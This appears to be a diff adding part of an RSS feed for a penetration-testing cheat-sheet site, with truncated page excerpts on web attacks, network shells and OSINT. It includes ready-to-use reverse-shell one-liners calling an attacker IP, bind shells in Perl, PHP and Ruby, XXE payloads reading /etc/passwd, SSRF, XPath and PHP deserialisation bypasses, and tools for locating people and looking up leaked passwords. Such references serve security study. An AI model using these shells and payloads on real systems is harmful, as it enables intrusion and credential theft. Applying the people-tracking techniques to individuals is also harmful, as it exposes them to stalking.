+ARP Spoofing # Old technique but still usable sometimes # You can spoof ARP trafic in order to discover new machines # If you are pivoting through a machine, you may need to upload arpspoof on the target scp /usr/sbin/arpspoof user@ip:/tmp # Then, you may need to identify and upload specific librairies # WARNING : It can be dangerous for target ldd /usr/sbin/arpspoof scp &amp;lt;path&amp;gt; user@ip:/tmp export LD_PRELOAD=.</description>
+    </item>
+    
+    <item>
+      <title>MISC</title>
+      <link>/cryptography/misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/cryptography/misc/</guid>
+      <description>XOR Encryption https://github.com/hellman/xortool https://github.com/tomchop/unxor 
+GPG Encryption sudo gpg --decrypt /mnt/media/dir2/findme.</description>
+    </item>
+    
+    <item>
+      <title>Omnibus</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/omnibus/</guid>
+      <description>General Informations https://github.com/InQuest/omnibus # An Omnibus is defined as a volume containing several novels or other items previously published separately # and that is exactly what the InQuest Omnibus project intends to be for Open Source Intelligence collection, research, and artifact management. # By providing an easy to use interactive command line application, users are able to create sessions to investigate various artifacts such as # IP addresses, domain names, email addresses, usernames, file hashes, Bitcoin addresses, and more as we continue to expand.</description>
+    </item>
+    
+    <item>
+      <title>PHP Serialization</title>
+      <link>/web-attacks/php-vulnerabilities/serialization/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/serialization/</guid>
+      <description>Resources https://www.owasp.org/index.php/PHP_Object_Injection 
+PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.php $systemCall = new SystemCall(&amp;#39;system(&amp;#34;ls&amp;#34;);&amp;#39;); if($rank === UserRankService::ADMIN_RANK){ $app-&amp;gt;render(&amp;#39;front/confidential.twig&amp;#39;, array(&amp;#39;admin&amp;#39; =&amp;gt; $rank, &amp;#39;systemCall&amp;#39; =&amp;gt; $systemCall)); }else { $app-&amp;gt;redirect(&amp;#39;/connexion&amp;#39;, &amp;#39;/connexion&amp;#39;, 301); }# Context - \Slim\Middleware\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\Exception $e) { $this-&amp;gt;app-&amp;gt;getLog()-&amp;gt;error(&amp;#39;Error unserializing session cookie value! &amp;#39; . $e-&amp;gt;getMessage()); }# Context - \App\Service\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-&amp;gt;hook = $hook; } function __wakeup() { $this-&amp;gt;result = eval($this-&amp;gt;hook); } function call() { $this-&amp;gt;__wakeup(); } }# You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:&amp;#34;slim.</description>
+    </item>
+    
+    <item>
+      <title>Password leaks</title>
+      <link>/open-source-intelligence-osint/human-recon/leaks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/leaks/</guid>
+      <description>PwnedOrNot https://github.com/thewhiteh4t/pwnedOrNot.git # Simple python tool used to check haveIbeenpwned leaks for an e-mail or a list # The tool will then check if the dump is accessible (using haveibeenpwned/pastebin) to get passwords python pwnedornot.py -h python pwnedornot.py -e email@test.com python pwnedornot.py -f file.txt Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search leaks and retrieve known passwords python pwndb.py --target email@test.fr python pwndb.py --list file python pwndb.py --target email@test.</description>
+    </item>
+    
+    <item>
+      <title>VHOST Scanning</title>
+      <link>/recon-enumeration/application-scans/vhost/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/application-scans/vhost/</guid>
+      <description> Virtual Host Scanner # Basic HTTP Scanner that&amp;#39;ll enumerate virtual hosts on a given IP # It may reveal hidden hosts # Docker ? ruby scan.rb --ip=192.168.1.101 --host=domain.tld # Options --ignore-http-codes --ignore-content-length --port --- If running on another port --wordlist --- specify an alternative location for the wordlist file --ssl --- on/off depending if you want to connect to HTTP --output --- output file</description>
+    </item>
+    
+    <item>
+      <title>Web Application Firewall (WAF)</title>
+      <link>/open-source-intelligence-osint/technical-recon/web_application_firewall/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/web_application_firewall/</guid>
+      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
+    </item>
+    
+    <item>
+      <title>Webshell</title>
+      <link>/shells-methods/webshell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shells-methods/webshell/</guid>
+      <description> Weevely # Weevely is insane ! # It&amp;#39;s like enhanced webshell which looks like a real shell # First, generate a payload shell weevely generate &amp;lt;password&amp;gt; &amp;lt;filename&amp;gt; # Then upload the file or copy the code wherever you can # Then you can just call your shell weevely &amp;lt;url&amp;gt; &amp;lt;password</description>
+    </item>
+    
+    <item>
+      <title>53 - DNS</title>
+      <link>/recon-enumeration/services-enumeration/53_dns/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/53_dns/</guid>
+      <description>Zone Transfer # Port scan and trying zone transfer nmap --script=dns-transfer-zone -p 53 domain # DNS Zone Transfer using dig dig axfr @IP guess_domain_name 
+Active Directory DNS # Zone Transfer using dig # Find AD-DS through DNS # Global Catalog dig -t SRV _gc._tcp.lab.ropnop.com # LDAP servers dig -t SRV _ldap._tcp.lab.ropnop.com # Kerberos KDC dig -t SRV _kerberos._tcp.lab.ropnop.com # Kerberos password change server dig -t SRV _kpasswd._tcp.lab.ropnop.com nmap --script dns-srv-enum --script-args “dns-srv-enum.</description>
+    </item>
+    
+    <item>
+      <title>Dorks</title>
+      <link>/open-source-intelligence-osint/technical-recon/dorks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/dorks/</guid>
+      <description>Automated Dorks Tools # GoogD0rker (https://github.com/ZephrFish/GoogD0rker/) ./googD0rker-txt.py -d example.com # Goohak (https://github.com/1N3/Goohak/ # Just run it on a target domain ./goohak domain.com 
+Google Dorks # Google Hacking made easy https://pentest-tools.com/information-gathering/google-hacking# # Search for documents on popular clouds site:drive.google.com &amp;lt;searchterm&amp;gt; site:dl.dropbox.com &amp;lt;searchterm&amp;gt; site:s3.amazonaws.com &amp;lt;searchterm&amp;gt; site:onedrive.live.com &amp;lt;searchterm&amp;gt; site:cryptome.org &amp;lt;searchterm&amp;gt; # Admins credentials intext:company_keyword &amp;amp; ext:txt | ext:sql | ext:cnf | ext:config | ext:log &amp;amp; intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;administrator&amp;#34; &amp;amp; intext:&amp;#34;password&amp;#34; | intext:&amp;#34;root&amp;#34; | intext:&amp;#34;admin&amp;#34; | intext:&amp;#34;administrator&amp;#34; # Look for domains indexed by others website site:bgp.</description>
+    </item>
+    
+    <item>
+      <title>ICMP Tricks</title>
+      <link>/network/icmp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/icmp/</guid>
+      <description>ICMP exfiltration # Using scapy $ scapy Welcome to Scapy (2.2.0) &amp;gt;&amp;gt;&amp;gt; pkts = rdpcap(&amp;#34;ch6.pcap&amp;#34;) &amp;gt;&amp;gt;&amp;gt; payload_echo_request = [ p[ICMP].load for p in pkts if (p[ICMP].type == 8 and p[ICMP].code == 0)] &amp;gt;&amp;gt;&amp;gt; outfile = open(&amp;#39;ICMP_payload.dump&amp;#39;, &amp;#39;wt&amp;#39;) &amp;gt;&amp;gt;&amp;gt; outfile.write(&amp;#34;&amp;#34;.join(payload_echo_request)) &amp;gt;&amp;gt;&amp;gt; outfile.close()# Using Python #!/usr/bin/python from scapy.all import * import yenc pkts = rdpcap(&amp;#34;./echo_request.pcap&amp;#34;) fichier = open(&amp;#34;./donnees&amp;#34;,&amp;#34;w&amp;#34;) for i in range(0,len(pkts)): fichier.write(pkts[i].load) print yenc.decode(&amp;#34;./donnees&amp;#34;,&amp;#34;./résultat&amp;#34;) 
+ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
+    </item>
+    
+    <item>
+      <title>Instagram</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/instagram/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/instagram/</guid>
+      <description>Tips &amp;amp; Tricks # Webstagram allows you to browse any Instagram account https://web.stagram.com # Grampsy https://gramfly.com/ # Instagram photo and video downloader https://downloadgram.com/ # SaveIG (public profiles) https://saveig.com 
+Instaloader (https://github.com/instaloader/instaloader) # Downloads public and private profiles, hashtags, user stories,feeds and saved media, # Downloads comments, geotags and captions of each post, # Automatically detects profile name changes and renames the targetdirectory accordingly, # Allows fine-grained customization of filters and where to storedownloaded media.</description>
+    </item>
+    
+    <item>
+      <title>Magento</title>
+      <link>/web-attacks/content-management-system-cms/magento/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/magento/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
+      <title>PHP Type Juggling</title>
+      <link>/web-attacks/php-vulnerabilities/type_juggling/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/type_juggling/</guid>
+      <description>Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping &amp;#34;0000&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;0e12&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;1abc&amp;#34; == int(1) -&amp;gt; TRUE &amp;#34;0abc&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;abc&amp;#34; == int(0) -&amp;gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx.</description>
+    </item>
+    
+    <item>
+      <title>Reverse Shell</title>
+      <link>/shells-methods/reverse/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shells-methods/reverse/</guid>
+      <description>Resources https://alamot.github.io/reverse_shells/ 
+Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  
+Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
+    </item>
+    
+    <item>
+      <title>Searching Someone</title>
+      <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
+      <description>Searching People https://i-sight.com/resources/101-osint-resources-for-investigators/ # You can use many online resources to search for people by name, phone number, etc.. Ancestry - Search for genealogy Filae - Search for genealogy, family, relationships... Infobel - Search worldwide people (white pages, yellow pages etc, you can find relations by name) MarketVisual - Map a company organization chart Numberway - Way to find others resources to get phone numbers Pipl - Search engines only for people Spokeo - Search for people information (only in USA) Usersearch - Search engine tool to find someone using pseudo/username Webmii - Search engine that compiles information on one person # Search by photo Tineye # Search on communities and blogs (reddit.</description>
+    </item>
+    
+    <item>
+      <title>Spiderfoot</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/spiderfoot/</guid>
+      <description>General Informations https://github.com/smicallef/spiderfoot https://www.spiderfoot.net/documentation/ # Query over 100 OSINT sources (IP, domain names, email, names and more) # Select the target, pick modules and spiderfoot will collect and build links # You can identify data leaks, vulnerabilities or sensitive information # Windows and Linux # Needed API Keys : Honeypot Checker, Shodan, VirusTotal, IBM X-Force Exchange # MalwarePatrol, BotScout, Cymon.io, Censys.io, Hunter.io, AlienVault OTX, ClearBit # BuiltWith, FraudGuard, IPinfo.io, CIRCL.</description>
+    </item>
+    
+    <item>
+      <title>XML External Entity (XXE) and XSLT</title>
+      <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
+      <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf 
+Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt;# XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; 
+XSLT Injection # You can execute commands through an external XML file &amp;lt;br /&amp;gt;Version: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:version&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor&amp;#39;)&amp;#34; /&amp;gt; &amp;lt;br /&amp;gt;Vendor URL: &amp;lt;xsl:value-of select=&amp;#34;system-property(&amp;#39;xsl:vendor-url&amp;#39;)&amp;#34; /&amp;gt; # Example &amp;lt;?</description>
+    </item>
+    
+    <item>
+      <title>XPath Injections</title>
+      <link>/web-attacks/server-side-injections/xpath/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/xpath/</guid>
+      <description>Basic authentication bypass # XPath login/password often works as follow # $xpath = &amp;quot;//user[user=&#39;&amp;quot; . $_GET[&#39;user&#39;] . &amp;quot;&#39; and pass=&#39;&amp;quot; . $_GET[&#39;pass&#39;] . &amp;quot;&#39;]&amp;quot;; # You can make the 2 conds TRUE and log with the first user user=&#39; or &#39;1&#39;=&#39;1&amp;amp;pass=&#39; or &#39;1&#39;=&#39;1 # Log using a specific user //user[username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;truc&#39;] ⇒ John&#39; or &#39;1&#39;=&#39;1 # Bypass the password (because of the ‘=’) &#39; or username=&#39;John&#39; or &#39;&#39;=&#39;</description>
+    </item>
+    
+    <item>
+      <title>80/443 - HTTP/HTTPS</title>
+      <link>/recon-enumeration/services-enumeration/80_443_https/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/80_443_https/</guid>
+      <description>Identification and Checks # IIS nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-iis-webdav-vuln &amp;lt;IP&amp;gt; # JBOSS (CVE-2010-0738) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2010-0738 &amp;lt;IP&amp;gt; # PHP-CGI (CVE-2012-1823) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2012-1823 &amp;lt;IP&amp;gt; # RCE Ruby on Rails (CVE-2013-0156) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2013-0156 &amp;lt;IP&amp;gt; # WAF Detection nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-waf-detect,http-waf-fingerprint &amp;lt;IP&amp;gt; # Check Heartbleed CVE-2014-0160 nmap -Pn -n -p 443 -v -T3 --script=ssl-heartbleed,ssl-enum-ciphers,ssl-known-key --script-args vulns.</description>
+    </item>
+    
+    <item>
+      <title>Bind Shell</title>
+      <link>/shells-methods/bind/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/shells-methods/bind/</guid>
+      <description> Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
+Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asp 
+Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; 
+PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&amp;#34;$ &amp;#34;,2))exit;\ $in=socket_read($cl,100);$cmd=popen(&amp;#34;$in&amp;#34;,&amp;#34;r&amp;#34;);while(!feof($cmd)){$m=fgetc($cmd);\ socket_write($cl,$m,strlen($m));}}&amp;#39; 
+Ruby ruby -rsocket -e &amp;#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,s,s,s)&amp;#39;</description>
+    </item>
+    
+    <item>
+      <title>Buscador</title>
+      <link>/open-source-intelligence-osint/buscador/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/buscador/</guid>
+      <description>Tools Custom Firefox Browser &amp;amp; Add-Ons Custom Chrome Browser &amp;amp; Extensions Tor Browser Custom Video Manipulation Utilities Custom Video Download Utility Amass BleachBit EmailHarvester ExifTool EyeWitness Ghiro GIMP Google Earth Pro HTTrack Cloner InstaLooter KeePassXC Kleopatra Knock Pages LibreOffice LinkedInt Maltego	Metagoofil MediaInfo Metadata Anonymisation Toolkit PhoneInfoga Photon ReconDog Recon-NG SkipTracer SocialMapper Spiderfoot StegoSuite SubBrute Sublist3r theHarvester Tinfoleak Twint Twitter Exporter VeraCrypt VLC Yubico Utilities 
+Tools descriptions # Firefox and some plugins - Download Star - ExifViewer - Firefox multiaccount - HTTPS Everywhere - Image Search Options - MJsonViewer - Nimbus Screen Capture - Resurrect Pages - Take Webpage Screenshots Entirely - uBlock Origin - User-Agent Switcher - Video DownloadHelper # Google Chrome with other plugins # TOR Browser # Custom Video Manipulation Utilities # Custom Video Download Utility # Amass → DNS Enumeration → Network Mapping # BleachBit → Clean your PC # EmailHarvester → Collect emails using search engines # Exiftool → Extract metadata from images # EyeWitness → Take screenshots from website → Get HTTP headers → Identify some credentials → Basic tool semi passive # Ghiro → Ghiro is a fully automated tool designed to run forensics analysis over a massive amount of images → Just using an user friendly and fancy web application.</description>
+    </item>
+    
+    <item>
+      <title>Company General Informations</title>
+      <link>/open-source-intelligence-osint/technical-recon/company_meta/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/company_meta/</guid>
+      <description>Company Informations # Find informations about a company https://opencorporates.com # Find multiples sites owned by the same individual/company http://www.spyonweb.com https://www.crunchbase.com https://fr.kompass.com/ https://www.infogreffe.fr/ # Jobs https://www.glassdoor.fr/index.htm # Find people based on several websites https://recruitin.net/ # Cadastre FR https://cadastre.gouv.fr # Call for tender → BOAMP https://www.boamp.fr/ # Legal and Financial informations (might not be free for full informations) https://www.societe.com/ # Brands https://www.inpi.fr/fr # Look for reported vulnerabilities https://www.</description>
+    </item>
+    
+    <item>
+      <title>Datasploit</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/datasploit/</guid>
+      <description>General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner.</description>
+    </item>
+    
+    <item>
+      <title>MISC &amp; Others</title>
+      <link>/web-attacks/content-management-system-cms/others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/content-management-system-cms/others/</guid>
+      <description>CMSimple # CMSimple LFI index.php ?sl=../adm&amp;amp;file=config&amp;amp;action=download&amp;amp;adm=1 
+NanoCMS # Password and sensitive data leak [url]/data/pagesdata.</description>
+    </item>
+    
+    <item>
+      <title>Server Side Request Forgery (SSRF)</title>
+      <link>/web-attacks/server-side-injections/ssrf/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/server-side-injections/ssrf/</guid>
+      <description>https://vinc.top/2016/11/24/server-side-request-forgery 
+PoC and enumeration # It is possible to prove the vulnerability by reading local files # Using the file protocol url=file:///etc/passwd # Then you can enumerate local services that are listening # Depending on the response http://localhost:&amp;lt;port&amp;gt; # It is also possible to use others protocols like gopher and dict # They don&amp;#39;t send HTTP headers and can avoid misinterpretation gopher://127.0.0.1:6379/test # Filter bypass http://127.1 instead of http://127.</description>
+    </item>
+    
+    <item>
+      <title>Skiptracer</title>
+      <link>/open-source-intelligence-osint/human-recon/skiptracer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/skiptracer/</guid>
+      <description>Skiptracer # Tool https://github.com/xillwillx/skiptracer/wiki # It uses some basic python webscraping to compile passive information on a target # Included modules will allow queries for the following : # Phone # Email # Screen names # Real names # Addresses # IP # Hostname # Breach Credentials python skiptracer.py -l phone python skiptracer.py -l email python skiptracer.py -l sn python skiptracer.py -l plate- # Phone Number (FR) https://www.</description>
+    </item>
+    
+    <item>
+      <title>Tinder</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/tinder/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/tinder/</guid>
+      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.</description>
+    </item>
+    
+    <item>
+      <title>Tricks &amp; Others</title>
+      <link>/web-attacks/php-vulnerabilities/tricks_others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/tricks_others/</guid>
+      <description>MISC # Path truncation # PHP max path is 4096 char # It is possible to bypass checks for one file, for example, by flooding the path before requesting a resource page=././././././././....... # There is a BIG difference between “$salt” and ‘$salt’. # Double quotes → interpreted as a variable # Simple quotes → interpreted as a string 
+Register Globals index.php ?</description>
+    </item>
+    
+    <item>
+      <title>110 - POP3</title>
+      <link>/recon-enumeration/services-enumeration/110_pop3/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/recon-enumeration/services-enumeration/110_pop3/</guid>
+      <description>Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:110 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:110 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:110 IP 
+Banner grabbing/checking # Using netcat nc &amp;lt;IP&amp;gt; 110 # Using telnet telnet &amp;lt;IP&amp;gt; 110</description>
+    </item>
+    
+    <item>
+      <title>Danger Zone</title>
+      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/danger_zone/</guid>
+      <description>General Informations https://github.com/woj-ciech/Danger-zone ⇒ HORRIBLE SETUP #FuckingGoogleSearchApiModule # Correlate data between domains, ips and email addresses, present it as a graph # And store everything into Elasticsearch and JSON files # You have to edit the settings.json file in order to provide your API keys and Elestic database info # Golden Rule → Don&amp;#39;t jump to conclusions too fast 
+Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--address ADDRESS] [--domain DOMAIN] [--elasticsearch] Correlate data between domains, ips and email addresses and present it as a graph.</description>
+    </item>
+    
+    <item>
+      <title>General - MISC - Multi</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
+      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php 
+SocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/***REMOVED*** 
+Youtube # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.</description>
+    </item>
+    
+    <item>
+      <title>Geolocation</title>
+      <link>/open-source-intelligence-osint/human-recon/geolocation/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
+      <description>Creepy # Creepy is a tool that performs geolocalization through social network inputs # Written in Python, you get a GUI # It uses modules for social networks # You need to first configurate your plugins (using API key for example) # Then you can start a new person project # You choose your plugins, let the soft searches and then add targets to the global search # Once done, you can start searching (often several minutes) # Then you will get locations on the world map for data found # Possible to export results https://www.</description>
+    </item>
+    
+    <item>
+      <title>Headers Injections</title>
+      <link>/web-attacks/headers_injections/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/headers_injections/</guid>
+      <description>Security Headers HTTP Strict Transport Security (HSTS) --- Force HTTPS if enabled on the website Content Security Policy (CSP) --- Restrict/Whitelist some resources for some users X-XSS-Protection --- Protection for XSS X-Frame-Options --- Protect from clickjacking by removing iframes X-Content-Type-Options --- Protect from MIME sniffing # Cookie Set-Cookie Secure --- Prevent cookie stealing during transport Set-Cookie HttpOnly --- Prevent cookie stealing in the web browser Set-Cookie SameSite --- Prevent from CSRF (cookies will stay on the website)</description>
+    </item>
+    
+    <item>
+      <title>Public Documents and Metadata</title>
+      <link>/open-source-intelligence-osint/technical-recon/documents_metadata/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/technical-recon/documents_metadata/</guid>
